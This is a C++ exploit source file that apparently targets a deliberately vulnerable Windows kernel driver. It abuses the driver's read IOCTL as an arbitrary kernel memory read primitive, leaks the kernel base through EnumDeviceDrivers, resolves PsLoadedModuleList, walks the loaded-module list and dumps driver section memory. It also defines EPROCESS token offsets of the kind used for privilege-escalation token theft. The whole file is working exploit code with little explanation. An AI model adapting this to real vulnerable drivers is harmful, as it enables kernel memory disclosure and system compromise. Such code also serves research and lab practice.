#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <iostream>
#include <sstream>

#define IOCTL_READ_BYTE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITE_BYTE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Define EPROCESS structure offsets
#define EPROCESS_PID_OFFSET   0x440     // PID offset in EPROCESS
#define EPROCESS_ACTIVEPROCESSLINKS_OFFSET   0x448     // PID offset in EPROCESS
#define EPROCESS_TOKEN_OFFSET 0x4b8     // Token offset in EPROCESS
#define EPROCESS_PEB_OFFSET 0x550     // Token offset in EPROCESS


// Replace this with the known address of PsLoadedModuleList (you can find it via kernel symbols or static analysis)
#define PS_LOADED_MODULE_LIST_ADDRESS 0xFFFFF800XXXXXXXX

// LDR_DATA_TABLE_ENTRY Offsets (simplified)
#define OFFSET_DLLBASE 0x30
#define OFFSET_SIZEOFIMAGE 0x40
#define LDR_DATA_TABLE_ENTRY_BASE_DLL_NAME_OFFSET 0x58
#define UNICODE_STRING_BUFFER_OFFSET 0x08
#define OFFSET_INLOADORDERLINKS 0x10

// PE Header Offsets (simplified for x64)
#define OFFSET_DOS_SIGNATURE 0x0
#define OFFSET_NT_HEADERS 0x3C
#define OFFSET_SECTION_HEADERS 0x108
#define OFFSET_NUMBER_OF_SECTIONS 0x06
#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16
#define IMAGE_DIRECTORY_ENTRY_BASE_RELOC 5

#define SECTION_NAME_LENGTH 8

using namespace std;

DWORD64 PsLoadedModuleList;
HANDLE hDevice;

/*
typedef struct _IMAGE_SECTION_HEADER {
    BYTE  Name[SECTION_NAME_LENGTH];
    DWORD VirtualSize;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;
    DWORD Characteristics;
} IMAGE_SECTION_HEADER;
*/
typedef struct _UNICODE_STRING
{
    USHORT Length;                                                          //0x0
    USHORT MaximumLength;                                                   //0x2
    USHORT* Buffer;                                                         //0x8
} UNICODE_STRING;
typedef UNICODE_STRING* PUNICODE_STRING;
typedef const UNICODE_STRING* PCUNICODE_STRING;

void displayMemoryDump(const uint8_t* memory, size_t size) {
    size_t i, j;

    for (i = 0; i < size; i += 16) {
        // Print 16 bytes in hex (grouped in 4-byte chunks)
        for (j = 0; j < 16 && i + j < size; j += 4) {
            printf("%02X%02X%02X%02X ", memory[i + j], memory[i + j + 1], memory[i + j + 2], memory[i + j + 3]);
        }

        // Fill the remainder with spaces if we're at the end of the dump and don't have a full 16 bytes
        for (; j < 16; j += 4) {
            printf("         ");
        }

        // Print corresponding ASCII characters on the right
        printf("| ");
        for (j = 0; j < 16 && i + j < size; j++) {
            uint8_t byte = memory[i + j];
            if (isprint(byte)) {
                printf("%c", byte);  // Print printable character
            }
            else {
                printf(".");  // Non-printable characters as '.'
            }
        }

        printf("\n");
    }
}

// +
HANDLE openDevice(PCWSTR symLink) {
    return CreateFile(
        symLink,   // The symbolic link to the device
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
}

// +
BYTE readBYTE(DWORD64 address) {
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Invalid handle to device. Error: " << GetLastError() << std::endl;
        return -1;
    }

    uint8_t buffer[9]; // buffer[0-7] = address, buffer[8] = value

    memcpy(buffer, &address, sizeof(DWORD64));

    bool success;
    DWORD bytesReturned;
    success = DeviceIoControl(
        hDevice,
        IOCTL_READ_BYTE,
        &buffer,
        sizeof(buffer),
        &buffer,
        sizeof(buffer),
        &bytesReturned,
        NULL);

    if (!success) {
        std::cerr << "Read failed. Error: " << GetLastError() << std::endl;
        return -1;
    }

    return buffer[8];
}

// +
DWORD64 readQWORD(DWORD64 address) {
    DWORD64 value = 0;
    for (int i = 0; i < 8; i++) {
        ((BYTE*)&value)[i] = readBYTE(address + i);
    }
    return value;
}

// Helper function to read memory from kernel space
void readKernelMemory(DWORD64 address, void* buffer, SIZE_T size) {
    for (SIZE_T i = 0; i < size; i++) {
        ((BYTE*)buffer)[i] = readBYTE(address + i);
    }
}

#define BASE_DLL_NAME_BUFFER_SIZE   256

void getModuleName(DWORD64 moduleListEntry, char* moduleName) {
    UNICODE_STRING BaseDllName;
    BaseDllName.Buffer = (USHORT*)malloc(BASE_DLL_NAME_BUFFER_SIZE);

    DWORD64 ptrBaseDllName = moduleListEntry + LDR_DATA_TABLE_ENTRY_BASE_DLL_NAME_OFFSET;
    readKernelMemory(ptrBaseDllName, (void*)&BaseDllName, sizeof(UNICODE_STRING));

    DWORD64 ptrPtrBaseDllNameBuffer = ptrBaseDllName + UNICODE_STRING_BUFFER_OFFSET;
    DWORD64 ptrBuffer = readQWORD(ptrPtrBaseDllNameBuffer);

    size_t unicodeStringLength = BaseDllName.Length; // Length in wchar_t
    wchar_t* unicodeStringBuffer[50];
    readKernelMemory(ptrBuffer, (void*)unicodeStringBuffer, unicodeStringLength);

    // Allocate buffer in user space and read kernel memory
    size_t length = BaseDllName.Length / sizeof(wchar_t); // Length in wchar_t

    wchar_t* userBuffer = new wchar_t[length + 1];
    memcpy(userBuffer, unicodeStringBuffer, BaseDllName.Length);
    userBuffer[length] = L'\0'; // Null-terminate

    // Convert to narrow C string
    wcstombs(moduleName, userBuffer, BaseDllName.Length);
    moduleName[length] = '\0';
    // cout << moduleName << endl;
    // convert wide character string to UNICODE_STRING
}

void readDataSection(const char* driverName) {
    DWORD64 moduleListEntry = PsLoadedModuleList;
    DWORD64 firstEntry = moduleListEntry;

    char moduleName[256];

    do {
        getModuleName(moduleListEntry, moduleName);
        // convert wide character string to UNICODE_STRING
        if (strstr(moduleName, driverName)) {
            printf("Found driver: %s\n", moduleName);

            // Read the driver base address (DllBase) and size (SizeOfImage)
            DWORD64 DllBase = readQWORD(moduleListEntry + OFFSET_DLLBASE); //30 
            DWORD64 SizeOfImage = readQWORD(moduleListEntry + OFFSET_SIZEOFIMAGE);//40

            printf("DllBase address: 0x%llx\n", DllBase);
            printf("Driver size: 0x%llx\n", SizeOfImage);

            IMAGE_DOS_HEADER imageDosHeader;
            readKernelMemory(DllBase, (void*)&imageDosHeader, sizeof(imageDosHeader));

            IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)DllBase + imageDosHeader.e_lfanew);

            USHORT number_of_sections;
            readKernelMemory((DWORD64)ntHeaders + OFFSET_NUMBER_OF_SECTIONS, &number_of_sections, sizeof(number_of_sections));

            cout << number_of_sections;
            DWORD64 ptrSectionHeaders = (DWORD64)ntHeaders + OFFSET_SECTION_HEADERS;

            // Locate the section headers
            IMAGE_SECTION_HEADER section;
            for (int i = 0; i < number_of_sections; i++) {
                readKernelMemory(ptrSectionHeaders + (i * sizeof(IMAGE_SECTION_HEADER)), &section, sizeof(IMAGE_SECTION_HEADER));
                char sectionName[9] = { 0 };
                memcpy(sectionName, section.Name, SECTION_NAME_LENGTH);
                if (memcmp(section.Name, "INIT", SECTION_NAME_LENGTH) == 0 || 
                    memcmp(section.Name, ".reloc", SECTION_NAME_LENGTH) == 0) continue;
                  //  printf(".data section found! VirtualAddress: 0x%lx, Size: 0x%lx\n", section.VirtualAddress, section.SizeOfRawData);

                    // Now read the .data section
                    DWORD64 data_section_address = DllBase + section.VirtualAddress;
                    BYTE* data_section_contents = (BYTE *)malloc(section.SizeOfRawData);

                    readKernelMemory(data_section_address, data_section_contents, section.SizeOfRawData);

                    // You now have the contents of the .data section
                    printf("Read %s section of size: %lx bytes\n", sectionName, section.SizeOfRawData);
                    displayMemoryDump(data_section_contents, section.SizeOfRawData);

                    // Do something with data_section_contents...
                    free(data_section_contents);
                    //break;
                //}
            }

            break;
        }

        // Move to the next module in the list
        DWORD64 flink = readQWORD(moduleListEntry);
        moduleListEntry = flink;
    } while (moduleListEntry != firstEntry); // Stop when we circle back to the first entry
}

// +
ULONG_PTR GetAddressKernelBase() // from userspace
{
    DWORD64 pKernelBaseAddress = 0;
    LPVOID* lpImageBase = NULL;
    DWORD dwBytesNeeded = 0;

    // first call calculates the exact size needed to read all the data
    if (!EnumDeviceDrivers(NULL, 0, &dwBytesNeeded)) {
        printf("[-] Couldn't EnumDeviceDrivers.\n");
        return pKernelBaseAddress;
    }

    // allocate enough memory to read all data from EnumDeviceDrivers
    if (!(lpImageBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) {
        printf("[-] Couldn't allocate heap for lpImageBase.\n");
        if (lpImageBase)
            HeapFree(GetProcessHeap(), 0, lpImageBase);

        return pKernelBaseAddress;
    }

    if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &dwBytesNeeded)) {
        printf("[-] Couldn't EnumDeviceDrivers.\n");
        if (lpImageBase)
            HeapFree(GetProcessHeap(), 0, lpImageBase);

        return pKernelBaseAddress;
    }

    // the first entry in the list is the kernel
    pKernelBaseAddress = ((DWORD64*)lpImageBase)[0];
    printf("[*] KernelBaseAddress: %llx\n", pKernelBaseAddress);

    return pKernelBaseAddress;
}

// +
DWORD GetOffsetPsLoadedModuleList() // from userspace
{
    HMODULE ntoskrnl = NULL;
    DWORD dwPsInitialSystemProcessOffset = 0;
    ULONG_PTR pPsInitialSystemProcess = 0;

    // value of ntoskrnl is the base address of the mapped ntoskrnl.exe in our process memory
    ntoskrnl = LoadLibraryA("ntoskrnl.exe");
    if (ntoskrnl == NULL) {
        printf("[-] Couldn't load ntoskrnl.exe\n");
        return 0;
    }

    pPsInitialSystemProcess = (ULONG_PTR)GetProcAddress(ntoskrnl, "PsLoadedModuleList");
    if (pPsInitialSystemProcess) {
        // substracting from the address of the symbol the base address gives us the offset
        dwPsInitialSystemProcessOffset = (DWORD)(pPsInitialSystemProcess - (ULONG_PTR)(ntoskrnl));
        FreeLibrary(ntoskrnl);
        return dwPsInitialSystemProcessOffset;
    }

    printf("[-] Couldn't GetProcAddress of PsInitialSystemProcess\n");
    return 0;
}

int main() {
//    const char* vulnerableDriver = "VulnerableDriver.sys";
//    readDataSection(vulnerableDriver);
    // Helper function to read memory from kernel space
    hDevice = openDevice(L"\\\\.\\VulnerableDriver");
    DWORD64 addressKernelBase = GetAddressKernelBase();
    if (!addressKernelBase) return -1;

    DWORD offsetPsLoadedModuleList = GetOffsetPsLoadedModuleList();
    if (!offsetPsLoadedModuleList) return -1;

    PsLoadedModuleList = readQWORD(addressKernelBase + offsetPsLoadedModuleList);
    std::cout << "PsLoadedModuleList is: 0x" << std::hex << PsLoadedModuleList << std::endl;

    scanf_s("%*c");

    readDataSection("VulnerableDriver.sys");
    CloseHandle(hDevice);
}